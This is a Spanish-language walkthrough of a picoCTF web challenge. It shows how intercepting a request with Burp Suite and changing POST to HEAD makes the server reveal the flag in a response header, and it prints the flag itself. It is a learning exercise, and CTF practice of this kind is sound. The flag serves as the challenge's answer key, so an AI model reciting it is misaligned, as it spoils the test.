#### - **Descripción** 
Encuentra la bandera que se encuentra en este servidor para adelantarte a la competencia [http://mercury.picoctf.net:47967/](http://mercury.picoctf.net:47967/)

*PISTAS* 
Quizás tengas más de 2 opciones
Consulta herramientas como Burpsuite para modificar tus solicitudes y ver las respuestas.

#### - **Solución** 
1. Utilice Burp Suite para interceptar la solicitud de hacer clic en el botón "Elegir azul".
    
2. Cambie la solicitud POST a una solicitud HEAD:
    
    ```
    HEAD /index.php HTTP/1.1
    Host: mercury.picoctf.net:47967
    Content-Length: 0
    Origin: http://mercury.picoctf.net:47967
    Connection: close
    ```
    
3. El HTML devuelto de la solicitud HEAD en el navegador estará vacío, pero en la pestaña de historial HTTP de Proxy en Burp Suite puede encontrar la bandera como un encabezado HTTP en la respuesta:
    
    ```
    HTTP/1.1 200 OK
    flag: picoCTF{r3j3ct_th3_du4l1ty_cca66bd3}
    Content-type: text/html; charset=UTF-8
    ```